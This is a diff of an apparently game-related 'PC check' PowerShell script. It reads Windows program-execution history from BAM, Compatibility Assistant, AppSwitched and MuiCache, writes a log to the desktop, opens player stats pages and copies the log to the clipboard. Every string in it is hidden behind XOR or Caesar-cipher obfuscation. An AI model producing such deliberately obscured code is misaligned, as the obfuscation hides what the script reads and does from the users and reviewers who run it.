+    $registryPath = $(-join('VYZA:\GMGHSA\QiffsbhQcbhfczGsh\Gsfjwqsg\poa\Ghohs\IgsfGshhwbug'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))
+    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like $(-join('*1001'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}})) }
 
     if ($userSettings) {
         foreach ($setting in $userSettings) {
-            Add-Content -Path $outputFile -Value ($($k7922=11;$b=[byte[]](0x6b,0x65);-join($b|%{[char]($_-bxor$k7922)})) + $($setting.PSPath))
+            Add-Content -Path $outputFile -Value ($(-join('`o'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}})) + $($setting.PSPath))
             $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
             foreach ($item in $items.PSObject.Properties) {
-                if (($item.Name -match $($k5306='wx>i&!xdf2tI';$b=[byte[]](0x12,0x00,0x5B);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5306);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -or $item.Name -match $($k6392='L[(%6<R{X,V4.TC';$b=[byte[]](0x62,0x29,0x49,0x57);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6392);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -and -not $loggedPaths.ContainsKey($item.Name)) {
+                if (($item.Name -match $(-join('bub'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}})) -or $item.Name -match $(-join('.tct'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}}))) -and -not $loggedPaths.ContainsKey($item.Name)) {
                     Add-Content -Path $outputFile -Value (Format-Output $item.Name $item.Value)
                     $loggedPaths[$item.Name] = $true
                 }
             }
         }
     } else {
-        Write-Host $($k4485='HvGQ9DPF}T>A';$b=[byte[]](0x06,0x19,0x67,0x23,0x5C,0x28,0x35,0x30,0x1C,0x3A,0x4A,0x61,0x3D,0x05,0x22,0x23,0x19,0x37,0x35,0x32,0x09,0x3D,0x50,0x26,0x3B,0x56,0x21,0x3E,0x4C,0x2A,0x34,0x68);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4485);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ForegroundColor Red
+        Write-Host $(-join('Bc fszsjobh igsf gshhwbug tcibr.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}})) -ForegroundColor Red
     }
-Write-Host $($k6516=236;$b=[byte[]](0xaa,0x89,0x98,0x8f,0x84,0x85,0x82,0x8b,0xcc,0xaf,0x83,0x81,0x9c,0x8d,0x98,0x85,0x8e,0x85,0x80,0x85,0x98,0x95,0xcc,0xad,0x9f,0x9f,0x85,0x9f,0x98,0x8d,0x82,0x98,0xcc,0xa9,0x82,0x98,0x9e,0x85,0x89,0x9f);-join($b|%{[char]($_-bxor$k6516)}))
+Write-Host $(-join('Nmbkpqvo Kwuxibqjqtqbg Iaaqabivb Mvbzqma'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))
     # Log entries from Compatibility Assistant Store
-    $compatRegistryPath = $($k4348=25;$b=[byte[]](0x51,0x52,0x5a,0x4c,0x23,0x45,0x4a,0x56,0x5f,0x4d,0x4e,0x58,0x4b,0x5c,0x45,0x54,0x70,0x7a,0x6b,0x76,0x6a,0x76,0x7f,0x6d,0x45,0x4e,0x70,0x77,0x7d,0x76,0x6e,0x6a,0x39,0x57,0x4d,0x45,0x5a,0x6c,0x6b,0x6b,0x7c,0x77,0x6d,0x4f,0x7c,0x6b,0x6a,0x70,0x76,0x77,0x45,0x58,0x69,0x69,0x5a,0x76,0x74,0x69,0x78,0x6d,0x5f,0x75,0x78,0x7e,0x6a,0x45,0x5a,0x76,0x74,0x69,0x78,0x6d,0x70,0x7b,0x70,0x75,0x70,0x6d,0x60,0x39,0x58,0x6a,0x6a,0x70,0x6a,0x6d,0x78,0x77,0x6d,0x45,0x4a,0x6d,0x76,0x6b,0x7c);-join($b|%{[char]($_-bxor$k4348)}))
+    $compatRegistryPath = $(-join('ZCUM:\KGXLOSJW\Eaujgkgxl\Oafvgok FL\UmjjwflNwjkagf\ShhUgehslXdsyk\Ugehslatadalq Skkaklsfl\Klgjw'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}}))
     $compatEntries = Get-ItemProperty -Path $compatRegistryPath
     $compatEntries.PSObject.Properties | ForEach-Object {
-        if (($_.Name -match $($k1342='(@cfghh.E<*#yN';$b=[byte[]](0x4D,0x38,0x06);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1342);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -or $_.Name -match $($k6630=105;$b=[byte[]](0x47,0x1b,0x08,0x1b);-join($b|%{[char]($_-bxor$k6630)}))) -and -not $loggedPaths.ContainsKey($_.Name)) {
+        if (($_.Name -match $(-join('kdk'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}})) -or $_.Name -match $(-join('.ktk'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}}))) -and -not $loggedPaths.ContainsKey($_.Name)) {
             Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
             $loggedPaths[$_.Name] = $true
         }
     }
-Write-Host $($k1638='#sntBXYrYPn03';$b=[byte[]](0x65,0x16,0x1A,0x17,0x2A,0x31,0x37,0x15,0x79,0x11,0x1E,0x40,0x40,0x70,0x04,0x07,0x00,0x21,0x30,0x3C,0x16,0x79,0x15,0x00,0x44,0x41,0x4A,0x16,0x1D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1638);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ForegroundColor Blue
+Write-Host $(-join('Nmbkpqvo IxxaAeqbkpml Mvbzqma'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}})) -ForegroundColor Blue
     # Log entries from FeatureUsage\AppSwitched
-    $newRegistryPath = $($k3811='hat,pi8EIx*';$b=[byte[]](0x20,0x2A,0x37,0x79,0x4A,0x35,0x6B,0x0A,0x0F,0x2C,0x7D,0x29,0x33,0x31,0x70,0x3D,0x00,0x5B,0x37,0x26,0x0B,0x45,0x0E,0x15,0x28,0x7B,0x19,0x07,0x5C,0x2A,0x3E,0x0B,0x76,0x2B,0x14,0x06,0x5E,0x15,0x07,0x4C,0x13,0x2C,0x0A,0x59,0x01,0x0E,0x1A,0x70,0x35,0x11,0x48,0x29,0x26,0x0A,0x4F,0x1A,0x3D,0x32,0x49,0x11,0x1D,0x4D,0x37,0x2C,0x2D,0x59,0x09,0x06,0x11,0x70,0x31,0x19,0x48,0x16,0x3E,0x11,0x5E,0x0B,0x09,0x11,0x48);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3811);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+    $newRegistryPath = $(-join('UXPH:\FBSGJNER\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Rkcybere\SrngherHfntr\NccFjvgpurq'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}}))
     if (Test-Path $newRegistryPath) {
         $newEntries = Get-ItemProperty -Path $newRegistryPath
         $newEntries.PSObject.Properties | ForEach-Object {
-            if (($_.Name -match $($k6757='nz%Tcj@d=B1}wD:';$b=[byte[]](0x0B,0x02,0x40);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6757);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -or $_.Name -match $($k7545='(,et]qW>';$b=[byte[]](0x06,0x5E,0x04,0x06);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7545);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -and -not $loggedPaths.ContainsKey($_.Name)) {
+            if (($_.Name -match $(-join('xqx'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}})) -or $_.Name -match $(-join('.fof'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))) -and -not $loggedPaths.ContainsKey($_.Name)) {
                 Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                 $loggedPaths[$_.Name] = $true
             }
         }
     }
-Write-Host $($k4623=159;$b=[byte[]](0xd9,0xfa,0xeb,0xfc,0xf7,0xf6,0xf1,0xf8,0xbf,0xd2,0xea,0xf6,0xdc,0xfe,0xfc,0xf7,0xfa,0xbf,0xda,0xf1,0xeb,0xed,0xf6,0xfa,0xec);-join($b|%{[char]($_-bxor$k4623)})) -ForegroundColor Blue
+Write-Host $(-join('Cbqzefkd JrfZxzeb Bkqofbp'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}})) -ForegroundColor Blue
     # Log entries from MuiCache
-    $muiCachePath = $($k7478=241;$b=[byte[]](0xb9,0xba,0xb2,0xa3,0xcb,0xad,0xbd,0x9e,0x92,0x90,0x9d,0xd1,0xa2,0x94,0x85,0x85,0x98,0x9f,0x96,0x82,0xad,0xa2,0x9e,0x97,0x85,0x86,0x90,0x83,0x94,0xad,0xbc,0x98,0x92,0x83,0x9e,0x82,0x9e,0x97,0x85,0xad,0xa6,0x98,0x9f,0x95,0x9e,0x86,0x82,0xad,0xa2,0x99,0x94,0x9d,0x9d,0xad,0xbc,0x84,0x98,0xb2,0x90,0x92,0x99,0x94);-join($b|%{[char]($_-bxor$k7478)}))
+    $muiCachePath = $(-join('ILDS:\Mpdbm Tfuujoht\Tpguxbsf\Njdsptpgu\Xjoepxt\Tifmm\NvjDbdif'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))
     if (Test-Path $muiCachePath) {
         $muiCacheEntries = Get-ChildItem -Path $muiCachePath
         $muiCacheEntries.PSObject.Properties | ForEach-Object {
-            if (($_.Name -match $($k6440=94;$b=[byte[]](0x3b,0x26,0x3b);-join($b|%{[char]($_-bxor$k6440)})) -or $_.Name -match $($k5080=202;$b=[byte[]](0xe4,0xb8,0xab,0xb8);-join($b|%{[char]($_-bxor$k5080)}))) -and -not $loggedPaths.ContainsKey($_.Name)) {
+            if (($_.Name -match $(-join('hah'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}})) -or $_.Name -match $(-join('.mvm'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+5)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+5)%26))}else{[char]$c}}))) -and -not $loggedPaths.ContainsKey($_.Name)) {
                 Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                 $loggedPaths[$_.Name] = $true
             }
         }
     }
 
-    Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch $($k9024=225;$b=[byte[]](0xbd,0x9a,0xcf,0xcb,0xbd,0x9c);-join($b|%{[char]($_-bxor$k9024)})) } | ForEach-Object { $_ -replace $($k6614=162;$b=[byte[]](0x98);-join($b|%{[char]($_-bxor$k6614)})), '' } | Set-Content $outputFile
+    Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch $(-join('\{.*\}'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}})) } | ForEach-Object { $_ -replace $(-join(':'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})), '' } | Set-Content $outputFile
 
     Log-BrowserFolders
     # Remove the placeholder Log-MUICacheEntries function call if not defined elsewhere
   
     $folderNames = Log-FolderNames | Sort-Object | Get-Unique
-    Add-Content -Path $outputFile -Value $($k9063='.6_,M{+';$b=[byte[]](0x4E,0x58,0x72,0x01,0x60,0x56,0x06,0x03,0x1B,0x72,0x01,0x60,0x56,0x06,0x03,0x1B,0x72,0x01,0x60);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9063);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
-    Add-Content -Path $outputFile -Value $($k5175='}Y6+I6';$b=[byte[]](0x1D,0x37,0x64,0x1D,0x69,0x63,0x0E,0x3C,0x44,0x45,0x28,0x5B,0x18,0x2A,0x0C);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5175);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+    Add-Content -Path $outputFile -Value $(-join('`o-----------------'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))
+    Add-Content -Path $outputFile -Value $(-join('`sW6 Zxjwsfrjx:'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}}))
 
     foreach ($name in $folderNames) {
         Add-Content -Path $outputFile -Value $name
-        $url = ($($k2580=78;$b=[byte[]](0x26,0x3a,0x3a,0x3e,0x3d,0x74,0x61,0x61,0x3d,0x3a,0x2f,0x3a,0x3d,0x60,0x2d,0x2d,0x61,0x3d,0x27,0x2b,0x29,0x2b,0x61);-join($b|%{[char]($_-bxor$k2580)})) + $name)
-        Write-Host ($($k9646='K-cx@C(vsRh:dxv';$b=[byte[]](0x04,0x5D,0x06,0x16,0x29,0x2D,0x4F,0x56,0x00,0x26,0x09,0x4E,0x17,0x58,0x10,0x24,0x5F,0x43);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9646);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $name + $($k5085='3JWphPfw^Au!..C';$b=[byte[]](0x13,0x25,0x39,0x50,0x3B,0x24,0x07,0x03,0x2D,0x6F,0x16,0x42,0x0E,0x00,0x6D,0x1D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5085);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -ForegroundColor Blue
+        $url = ($(-join('cookn://novon.xx/ndzbz/'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+5)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+5)%26))}else{[char]$c}})) + $name)
+        Write-Host ($(-join('Stirmrk wxexw jsv '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}})) + $name + $(-join(' gf Klslk.uu ...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}}))) -ForegroundColor Blue
         Start-Process $url
         Start-Sleep -Seconds 0.5
     }
 }
-Write-Host $($k7413=183;$b=[byte[]](0x97,0xf1,0xd2,0xc3,0xd4,0xdf,0xde,0xd9,0xd0,0x97,0xf3,0xd8,0xc0,0xd9,0xdb,0xd8,0xd6,0xd3,0xd2,0xd3,0x97,0xf5,0xc5,0xd8,0xc0,0xc4,0xd2,0xc5,0xc4,0x97);-join($b|%{[char]($_-bxor$k7413)})) -ForegroundColor Blue
+Write-Host $(-join(' Dcrafgle Bmuljmybcb Zpmuqcpq '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}})) -ForegroundColor Blue
 function Log-BrowserFolders {
-    Write-Host $($k4919='L[KJ_';$b=[byte[]](0x00,0x34,0x2C,0x2D,0x36,0x22,0x3C,0x6B,0x38,0x3A,0x2B,0x7B,0x2E,0x24,0x2B,0x3E,0x32,0x2E,0x39,0x7F,0x25,0x35,0x38,0x23,0x3B,0x29,0x7B,0x1B,0x25,0x28,0x29,0x29,0x18,0x22,0x3A,0x20,0x37,0x65,0x64,0x71);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4919);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ForegroundColor DarkYellow
-    $registryPath = $($k1963='>;OQ]S.R,3m';$b=[byte[]](0x76,0x70,0x03,0x1C,0x67,0x0F,0x7D,0x1D,0x6A,0x67,0x3A,0x7F,0x69,0x0A,0x0D,0x1E,0x3F,0x47,0x37,0x42,0x47,0x1E,0x62,0x68,0x3B,0x30,0x2F,0x27,0x63,0x37,0x42,0x46,0x24,0x50,0x4F,0x2A,0x23,0x33,0x36,0x5A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1963);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
-    $desktopPath = [System.Environment]::GetFolderPath($($k2786='L,8f^[[h6mXV';$b=[byte[]](0x08,0x49,0x4B,0x0D,0x2A,0x34,0x2B);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2786);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))
-    $outputFile = Join-Path -Path $desktopPath -ChildPath $($k4062=113;$b=[byte[]](0x21,0x12,0x32,0x19,0x14,0x12,0x1a,0x3d,0x1e,0x16,0x02,0x5f,0x05,0x09,0x05);-join($b|%{[char]($_-bxor$k4062)}))
+    Write-Host $(-join('Wzrrtyr cpr pyectpd tydtop AzhpcDspww...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+15)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+15)%26))}else{[char]$c}})) -ForegroundColor DarkYellow
+    $registryPath = $(-join('VYZA:\GCTHKOFS\Qzwsbhg\GhofhAsbiWbhsfbsh'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))
+    $desktopPath = [System.Environment]::GetFolderPath($(-join('Bcqirmn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}})))
+    $outputFile = Join-Path -Path $desktopPath -ChildPath $(-join('ObBgdbjKnfr.sws'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}}))
     if (Test-Path $registryPath) {
         $browserFolders = Get-ChildItem -Path $registryPath
-        Add-Content -Path $outputFile -Value $($k9220=253;$b=[byte[]](0x9d,0x93,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0,0xd0);-join($b|%{[char]($_-bxor$k9220)}))
-        Add-Content -Path $outputFile -Value $($k3244='PMC6B^.auIvq';$b=[byte[]](0x30,0x23,0x01,0x44,0x2D,0x29,0x5D,0x04,0x07,0x69,0x30,0x1E,0x3C,0x29,0x26,0x44,0x31,0x64);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3244);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+        Add-Content -Path $outputFile -Value $(-join('`a-----------------'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}}))
+        Add-Content -Path $outputFile -Value $(-join('`rFvsawiv Jsphivw:'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}}))
         foreach ($folder in $browserFolders) { Add-Content -Path $outputFile -Value $folder.Name }
     } else {
-        Write-Host $($k3182='4-IpiWByV0HS';$b=[byte[]](0x66,0x48,0x2E,0x19,0x1A,0x23,0x30,0x00,0x76,0x40,0x29,0x27,0x5C,0x0D,0x2F,0x1F,0x1B,0x77,0x20,0x0B,0x39,0x47,0x3B,0x36,0x46,0x5E,0x69,0x1E,0x06,0x23,0x62,0x1F,0x39,0x45,0x26,0x37,0x1A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3182);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ForegroundColor Red
+        Write-Host $(-join('Pcegqrpw nyrf dmp zpmuqcpq lmr dmslb.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}})) -ForegroundColor Red
     }
 }
-Get-Command -Name $($k8179='3HLO-_E4&[cl4';$b=[byte[]](0x64,0x3A,0x25,0x3B,0x48,0x72,0x0D,0x5B,0x55,0x2F);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8179);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) | Select-Object -ExpandProperty Name | Out-Null
+Get-Command -Name $(-join('Xsjuf-Iptu'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}})) | Select-Object -ExpandProperty Name | Out-Null
 
 function Log-WindowsInstallDate {
-    Write-Host $($k1085='9wpGZi';$b=[byte[]](0x75,0x18,0x17,0x20,0x33,0x07,0x5E,0x57,0x27,0x2E,0x34,0x0D,0x56,0x00,0x03,0x67,0x33,0x07,0x4A,0x03,0x11,0x2B,0x36,0x49,0x5D,0x16,0x04,0x22,0x74,0x47,0x17);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1085);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ForegroundColor DarkYellow
+    Write-Host $(-join('Bewwydw Mydtemi ydijqbb tqju...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}})) -ForegroundColor DarkYellow
     $os = Get-WmiObject -Class Win32_OperatingSystem
     $installDate = $os.ConvertToDateTime($os.InstallDate)
-    $desktopPath = [System.Environment]::GetFolderPath($($k5999=213;$b=[byte[]](0x91,0xb0,0xa6,0xbe,0xa1,0xba,0xa5);-join($b|%{[char]($_-bxor$k5999)})))
-    $outputFile = Join-Path -Path $desktopPath -ChildPath $($k7785=82;$b=[byte[]](0x02,0x31,0x11,0x3a,0x37,0x31,0x39,0x1e,0x3d,0x35,0x21,0x7c,0x26,0x2a,0x26);-join($b|%{[char]($_-bxor$k7785)}))
-    Add-Content -Path $outputFile -Value $($k9217='RSRwz[;QxtvL';$b=[byte[]](0x32,0x3D,0x7F,0x5A,0x57,0x76,0x16,0x7C,0x55,0x59,0x5B,0x61,0x7F,0x7E,0x7F,0x5A,0x57,0x76,0x16);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9217);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
-    Add-Content -Path $outputFile -Value ($($k3413=218;$b=[byte[]](0xba,0xb4,0x8d,0xb3,0xb4,0xbe,0xb5,0xad,0xa9,0xfa,0x93,0xb4,0xa9,0xae,0xbb,0xb6,0xb6,0xbb,0xae,0xb3,0xb5,0xb4,0xfa,0x9e,0xbb,0xae,0xbf,0xe0,0xfa);-join($b|%{[char]($_-bxor$k3413)})) + $installDate)
+    $desktopPath = [System.Environment]::GetFolderPath($(-join('Hiwoxst'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}})))
+    $outputFile = Join-Path -Path $desktopPath -ChildPath $(-join('ZmMromuVyqc.dhd'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}}))
+    Add-Content -Path $outputFile -Value $(-join('`t-----------------'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}}))
+    Add-Content -Path $outputFile -Value ($(-join('`oXjoepxt Jotubmmbujpo Ebuf: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}})) + $installDate)
 }
 $m2ivc4e = Get-Random -Minimum 1000 -Maximum 9999; $DzOz = $($m2ivc4e / 2); $m2ivc4e = $DzOz * 2; $m2ivc4e = $null; $DzOz = $null
 
@@ -265,24 +265,24 @@ Log-WindowsInstallDate
 Find-RarAndExeFiles
 Find-SusFiles
 
-$desktopPath = [System.Environment]::GetFolderPath($($k4027=82;$b=[byte[]](0x16,0x37,0x21,0x39,0x26,0x3d,0x22);-join($b|%{[char]($_-bxor$k4027)})))
+$desktopPath = [System.Environment]::GetFolderPath($(-join('Tuiajef'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}})))
 # Copy the log file to clipboard
-$logFilePath = Join-Path -Path $desktopPath -ChildPath $($k2626='iSLxRX3}O]5o';$b=[byte[]](0x39,0x30,0x0F,0x10,0x37,0x3B,0x58,0x31,0x20,0x3A,0x46,0x41,0x1D,0x2B,0x38);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2626);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+$logFilePath = Join-Path -Path $desktopPath -ChildPath $(-join('MzZebzhIldp.quq'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}}))
 
 if (Test-Path $logFilePath) {
     Set-Clipboard -Path $logFilePath
-    Write-Host $($k7746='nH_&t4b';$b=[byte[]](0x22,0x27,0x38,0x06,0x12,0x5D,0x0E,0x0B,0x68,0x3C,0x49,0x04,0x5D,0x07,0x0A,0x68,0x2B,0x49,0x54,0x57,0x0E,0x07,0x38,0x3D,0x49,0x15,0x46,0x06,0x40);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7746);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ForegroundColor DarkRed
+    Write-Host $(-join('Ild cfib zlmfba ql zifmylxoa.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}})) -ForegroundColor DarkRed
 } else {
-    Write-Host $($k8716=36;$b=[byte[]](0x68,0x4b,0x43,0x04,0x42,0x4d,0x48,0x41,0x04,0x4a,0x4b,0x50,0x04,0x42,0x4b,0x51,0x4a,0x40,0x04,0x4b,0x4a,0x04,0x50,0x4c,0x41,0x04,0x40,0x41,0x57,0x4f,0x50,0x4b,0x54,0x0a);-join($b|%{[char]($_-bxor$k8716)})) -ForegroundColor Red
